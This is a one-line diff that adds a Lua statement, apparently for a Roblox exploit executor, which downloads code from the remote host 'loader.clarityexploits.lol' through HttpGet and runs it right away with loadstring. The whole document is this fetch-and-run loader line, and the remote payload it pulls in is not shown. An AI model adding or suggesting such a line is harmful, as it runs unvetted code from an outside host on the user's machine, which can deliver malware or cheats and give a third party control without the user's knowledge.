@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://loader.clarityexploits.lol"))()
